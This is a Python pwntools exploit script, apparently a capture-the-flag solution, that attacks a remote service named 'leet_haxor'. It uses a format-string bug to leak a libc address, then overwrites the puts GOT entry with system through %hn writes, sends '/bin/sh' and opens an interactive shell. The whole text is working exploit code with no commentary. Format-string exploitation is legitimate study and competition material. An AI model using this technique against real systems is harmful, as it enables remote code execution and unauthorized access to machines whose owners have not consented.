from pwn import *

elf = ELF('./leet_haxor')
libc = elf.libc

puts_got = 0x601020
p = remote('jh2i.com', 50022)
tmp = '%18$n'
payload1 = '%33$p'
print p.recv()
p.sendline('0')
print p.recv()
p.sendline(payload1)
a = p.recvline()
libc.address = int(a,16)-231-libc.sym['__libc_start_main']
print 'libc address: ', hex(libc.address)
f2b = int(hex(libc.sym['system'])[4:10], 16)
n2b = int(hex(libc.sym['system'])[10:14], 16)
if f2b>n2b:
    payload2 = p64(puts_got)+p64(puts_got+2)+'%'+str(n2b)+'x'+'%18$hn'+'%'+str(f2b-n2b)+'x'+'%19$hn'
else:
    payload2 = p64(puts_got)+p64(puts_got+2)+'%'+str(f2b)+'x'+'%18$hn'+'%'+str(n2b-f2b)+'x'+'%19$hn'
print p.recv()
p.sendline('1')
print p.recv()
p.sendline(payload2)
print p.recv()
p.sendline('1')
print p.recv()
p.sendline('/bin/sh #')
p.interactive()
